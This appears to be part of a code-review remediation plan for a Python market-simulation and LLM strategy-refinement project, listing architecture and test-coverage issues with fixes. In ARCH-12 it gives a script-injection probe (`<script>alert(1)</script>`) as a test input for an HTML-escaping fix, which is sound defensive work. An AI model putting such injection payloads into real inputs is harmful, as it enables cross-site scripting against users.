**Location:** `src/rohan/ui/0_Terminal.py` (1812 lines),
`src/rohan/ui/pages/1_Refinement_Lab.py` (1366 lines)

**What's wrong:** Both UI pages mix sidebar configuration, execution logic,
chart rendering, metric display, and session management in single files. At
1800+ lines, they're difficult to navigate and modify.

**Proposed fix:** Extract into component modules:
```
src/rohan/ui/
├── components/
│   ├── sidebar_config.py      # build_simulation_config()
│   ├── execution_panel.py     # run_simulation(), display_results()
│   ├── analysis_charts.py     # render_price_charts(), render_volume()
│   └── metric_cards.py        # render_metric_row() — reuse in both pages
```

**Verification:** Both pages render identically after refactoring.


### - [ ] ARCH-7: Base64 charts accumulate in LangGraph state — O(iterations × scenarios) (MEDIUM)

**Location:** `src/rohan/llm/state.py`, lines 82-93;
`src/rohan/llm/nodes.py`, lines 460-476 and 886-907

**What's wrong:** Each `ScenarioResult` carries 6 base64-encoded PNG images
(~50 KB each). These are copied into `IterationSummary.scenario_metrics` and
accumulated in the `iterations` list. With 5 iterations × 3 scenarios × 6
images × ~50 KB ≈ **4.5 MB** of image data flowing through every graph step,
serialized/deserialized at each checkpoint.

**Proposed fix:** Store charts in a filesystem artifact directory with UUID-based
paths. Only keep path references in the graph state:

```python
class ScenarioResult(BaseModel):
    # Replace base64 fields with:
    chart_paths: dict[str, str] = Field(default_factory=dict)
    # e.g., {"price": "/tmp/rohan/charts/{uuid}.png", ...}
```

Introduce a `ChartStore` protocol that can be swapped to S3/GCS later.

**Verification:** Run a 5-iteration refinement and verify that total graph state
size stays under 500 KB (vs. current 4+ MB).


### - [ ] ARCH-8: No rate limiting on LLM API calls (MEDIUM)

**Location:** `src/rohan/llm/nodes.py` (writer, explainer, aggregator);
`src/rohan/llm/factory.py`

**What's wrong:** Multiple LLM calls per iteration (1 writer + N explainers + 1
aggregator) with no backoff or concurrency control. The `Send` fan-out for
scenarios can fire parallel explainer calls, potentially hitting provider rate
limits.

**Proposed fix:** Add a configurable rate limiter (e.g., `asyncio.Semaphore` or
`tenacity` retry with exponential backoff) either in the factory or as a
LangChain callback:

```python
from langchain_core.rate_limiters import InMemoryRateLimiter

rate_limiter = InMemoryRateLimiter(
    requests_per_second=0.5,  # 30 requests per minute
    max_bucket_size=5,
)

model = ChatOpenAI(..., rate_limiter=rate_limiter)
```

**Verification:** Configure a low rate limit and verify that requests are spaced
correctly (check timestamps in logs).


### - [ ] ARCH-9: `DatabaseConnector.__init__` lacks dependency injection (LOW)

**Location:** `src/rohan/framework/database/database_connector.py`, lines 33-34

**What's wrong:**
```python
def __init__(self) -> None:
    settings = DatabaseSettings()
```

The constructor takes no parameters and always reads from env vars. Tests must
set environment variables or monkeypatch `DatabaseSettings`.

**Proposed fix:** Accept an optional `connection_string` parameter:
```python
def __init__(self, connection_string: str | None = None) -> None:
    settings = DatabaseSettings()
    url = connection_string or settings.connection_string
    # ...
```

**Verification:** Create a `DatabaseConnector("sqlite:///:memory:")` in a test
without setting env vars.


### - [ ] ARCH-10: Hardcoded `"ABM"` ticker in `AbidesOutput` (LOW)

**Location:** `src/rohan/simulation/abides_impl/abides_output.py`, line 129

**What's wrong:** The order book lookup is hardcoded to `"ABM"`:
```python
self.exchange_agent.order_books["ABM"]
```

If `SimulationSettings.ticker` is set to something other than `"ABM"`, this
raises `KeyError`.

**Proposed fix:** Accept ticker as constructor parameter or read from settings:
```python
def __init__(self, end_state: dict, ticker: str = "ABM"):
    self._ticker = ticker
# ...
self.exchange_agent.order_books[self._ticker]
```

**Verification:** Create a simulation with `ticker="TEST"` and verify it
doesn't crash.


### - [ ] ARCH-11: `save_logs` uses slow `iterrows()` (LOW)

**Location:** `src/rohan/framework/repository.py`, lines 113-155

**What's wrong:**
```python
for _, row in logs.iterrows():
    # ... build record dict per row
```

`DataFrame.iterrows()` is the slowest way to iterate a DataFrame. With
thousands of agent log entries per simulation, this is a bottleneck.

Compare with `save_market_data` on line 87, which correctly uses
`data.to_dict(orient="records")`.

**Proposed fix:** Vectorize the preprocessing and use bulk insert:
```python
records = logs.copy()
records["run_id"] = run_id
records = records.rename(columns={...})  # remap columns
session.execute(insert(AgentLog), records.to_dict(orient="records"))
```

**Verification:** Benchmark with 10,000 log rows — should be 10x faster.


### - [ ] ARCH-12: HTML injection risk in UI `unsafe_allow_html=True` (LOW)

**Location:** `src/rohan/ui/0_Terminal.py`, lines 758-778;
`src/rohan/ui/pages/1_Refinement_Lab.py`, line 968

**What's wrong:** User-controlled input (config date, ticker, etc.) and
LLM-generated output (class names, descriptions) are interpolated directly into
HTML strings without escaping:

```python
st.markdown(f"<code>{class_name}</code>", unsafe_allow_html=True)
```

In a Streamlit context (single-user, local app), XSS risk is limited. But if
ever deployed as a shared Streamlit app, these are injection vectors.

**Proposed fix:** Apply `html.escape()` on all dynamic values before
interpolating into `unsafe_allow_html` templates:
```python
import html
st.markdown(f"<code>{html.escape(class_name)}</code>", unsafe_allow_html=True)
```

**Verification:** Set ticker to `<script>alert(1)</script>` and verify the raw
text renders rather than executing.


### - [ ] ARCH-13: Duplicated DB initialization logic across UI pages (LOW)

**Location:** `src/rohan/ui/0_Terminal.py`, lines 38-43;
`src/rohan/ui/pages/1_Refinement_Lab.py`, lines 63-66

**What's wrong:** The same DB-init pattern is copy-pasted:
```python
if not st.session_state.get("_db_initialised"):
    with contextlib.suppress(Exception):
        initialize_database()
    st.session_state["_db_initialised"] = True
```

If the initialization logic changes, both must be updated.

**Proposed fix:** Extract to a shared helper:
```python
# src/rohan/ui/utils/startup.py
def ensure_db_initialized():
    if not st.session_state.get("_db_initialised"):
        try:
            initialize_database()
        except Exception:
            logger.warning("DB init failed", exc_info=True)
        st.session_state["_db_initialised"] = True
```

**Verification:** Both pages import and call the shared function.


### - [ ] ARCH-14: `_save_rich_analysis_artifacts` is dead code (LOW)

**Location:** `src/rohan/framework/simulation_engine.py`, lines 93-143

**What's wrong:** The method `_save_rich_analysis_artifacts` exists on
`SimulationEngine` but is never called by any code path. It was likely
superseded by the artifact storage in `RefinementRepository`.

**Proposed fix:** Remove the method or add a `# TODO: integrate` comment with
a ticket reference.

**Verification:** Grep for `_save_rich_analysis_artifacts` and verify zero call
sites.


### - [ ] ARCH-15: `SimulationRunner.validate()` is dead code (LOW)

**Location:** `src/rohan/simulation/simulation_runner.py`, lines 39-45

**What's wrong:**
```python
def validate(self) -> None:
    if self.settings is None:
        raise ValueError("Settings must be configured")
```

`self.settings` is always set in `__init__`, so this condition can never be
`True`. The method is never called externally either.

**Proposed fix:** Remove the method, or change to validate meaningful invariants
(e.g., `settings.start_time < settings.end_time`).

**Verification:** Grep for `.validate()` calls and confirm none exist.

---

## Workstream 5 — Test Coverage & Quality (MEDIUM-LOW)

### - [ ] TEST-1: Missing unit tests for `AbidesConfigMapper` (MEDIUM)

**Location:** `src/rohan/simulation/abides_impl/abides_config_mapper.py`

**What's missing:** No dedicated tests for:
- Agent count correctness after `_build_agents()`
- Oracle parameter passthrough
- Latency model type switching (NO_LATENCY vs. DETERMINISTIC vs. CUBIC)
- The mapping from `SimulationSettings` fields to ABIDES config dicts

These are only exercised indirectly through slow integration tests.

**Proposed fix:** Create `tests/test_abides_config_mapper.py` with parametrized
tests for each agent type, oracle configuration, and latency model.


### - [ ] TEST-2: Missing unit tests for `RandomStateHandler` (MEDIUM)

**Location:** `src/rohan/simulation/abides_impl/random_state_handler.py`

**What's missing:**
- Same seed → same random state sequence
- Different seeds → different sequences
- Edge cases: `seed=0`, `seed=2^32 - 1`

**Proposed fix:** Create `tests/test_random_state_handler.py`.


### - [ ] TEST-3: Missing tests for `StrategicAgentAdapter` order lifecycle (MEDIUM)

**Location:** `src/rohan/simulation/abides_impl/strategic_agent_adapter.py`

**What's missing:** `order_modified`, `order_partial_cancelled`,
`order_replaced`, and `market_closed` callbacks are untested. These are
complex stateful operations that update `_open_orders_cache` and
`_filled_quantities`.

**Proposed fix:** Create tests with mock kernel/exchange agent for each callback.


### - [ ] TEST-4: LLM graph tests are routing-only smoke tests (MEDIUM)

**Location:** `tests/test_llm_graph.py`

**What's missing:** Tests verify node existence and routing logic
(`validation_router`, `should_continue`) but never invoke the full graph — even
with fully mocked LLM calls. There is no test that exercises the write →
validate → execute → explain → aggregate path.

**Proposed fix:** Add an integration test with `MagicMock` LLM models that
exercises the full graph for 1 iteration. Verify state transitions and output
shape.


### - [ ] TEST-5: No property-based tests for simulation models (LOW)

**Location:** `tests/test_property_based.py`

**What's missing:**
- `MarketState` computed fields (`mid_price`, `spread`) with fuzzy inputs
- `OrderAction` factory methods (`.cancel()`, `.modify()`, `.replace()`)
- `SimulationMetrics` / `MarketMetrics` field interactions
- The `_infer_action_type` validator on `OrderAction`

**Proposed fix:** Add Hypothesis strategies for these models in
`test_property_based.py`.


### - [ ] TEST-6: Pandera schemas lack value-range constraints (LOW)

**Location:** `src/rohan/simulation/models/schemas.py`, lines 68-70

**What's missing:**
- No `ge=0` on prices and quantities (negative prices pass validation)
- No cross-column invariant (bid < ask) on L2 schema
- `time_placed` documented as a guaranteed column but not in the schema

**Proposed fix:** Add `ge=0` checks and a custom `dataframe_check` for bid < ask.


### - [ ] TEST-7: `_base_state` helper suppresses type safety in tests (LOW)

**Location:** `tests/test_llm_nodes.py`, line 84;
`tests/test_llm_graph.py`, line 26

**What's wrong:**
```python
state.update(overrides)  # type: ignore[typeddict-item]
```

This allows any key to be injected into the state, including typos. A mistyped
key (e.g., `"crrent_code"` instead of `"current_code"`) would silently be
accepted and cause test failures that are hard to diagnose.

**Proposed fix:** Type the `overrides` parameter as `Partial[RefinementState]`
or use a factory function that validates keys:
```python
def _base_state(**overrides: Unpack[RefinementState]) -> RefinementState:
    ...
```

### - [ ] TEST-8: Triple `pytestmark` assignment in property-based tests (LOW)

**Location:** `tests/test_property_based.py`, lines 176-180

**What's wrong:** `pytestmark = pytest.mark.slow` is assigned 3 times in the
same module. Only the last assignment takes effect. This is a copy-paste error
from splitting test classes.

**Proposed fix:** Define `pytestmark` once at module level, or use the
`@pytest.mark.slow` decorator on each test class individually.

**Verification:** Run `pytest -m slow` and verify all intended tests are
collected.

---

## Summary

| Workstream | Severity | Count | Key Themes |
|------------|----------|-------|------------|
| **WS1: Security** | CRITICAL/HIGH | 5 | Sandbox escape via `__import__`, API key exposure, broken timeout |
| **WS2: Database** | HIGH/MEDIUM | 10 | Mutable defaults, detached ORM objects, N+1 queries, no migrations |
| **WS3: Reliability** | HIGH/MEDIUM | 11 | Memory leaks, silent errors, `inf` propagation, dead UI logic |
| **WS4: Architecture** | MEDIUM/LOW | 15 | God class, DRY violations, circular imports, state bloat |
| **WS5: Tests** | MEDIUM/LOW | 8 | Missing unit tests, weak graph tests, schema gaps |
| **Total** | | **49** | |

### Recommended execution order

1. **WS1 first** — security fixes are non-negotiable before any multi-user deployment
2. **WS3 REL-1 through REL-6** — correctness issues that affect daily development
3. **WS2 DB-1 through DB-4** — data integrity fixes before DB grows
4. **WS4** — incremental architecture improvements, can be spread over sprints
5. **WS5** — test coverage can be added alongside feature development
6. **WS2 DB-5** (Alembic) — before the first production data exists

### What's working well

For transparency, here's what the codebase does **right**:

- **Domain modeling** — `strategy_api.py`, `analysis_models.py`, and the scoring
  system are exceptionally well-typed with Pydantic, including docstrings, field
  descriptions, computed properties, and model validators.
- **Deterministic scoring** — The 6-axis scoring system in `scoring.py` is
  thoroughly tested with 89 parametrized vectors covering all boundary
  conditions.
- **LangGraph architecture** — The write → validate → execute → explain →
  aggregate loop is cleanly decomposed into single-responsibility nodes with
  well-defined state contracts.
- **ABIDES integration** — The adapter pattern (`StrategicAgentAdapter`,
  `AbidesConfigMapper`, `AbidesOutput`) cleanly isolates the third-party
  simulator from business logic.
- **Reproducibility** — `RandomStateHandler` provides deterministic seed
  management with independent per-component random states.
- **Config management** — `pydantic-settings` with env vars is the right choice
  for this stage. Settings are well-validated with `Field` constraints.
- **Test quality** — `test_deterministic_scoring.py` and
  `test_strategy_validator.py` are exemplary. Node tests are comprehensive with
  appropriate mocking boundaries.
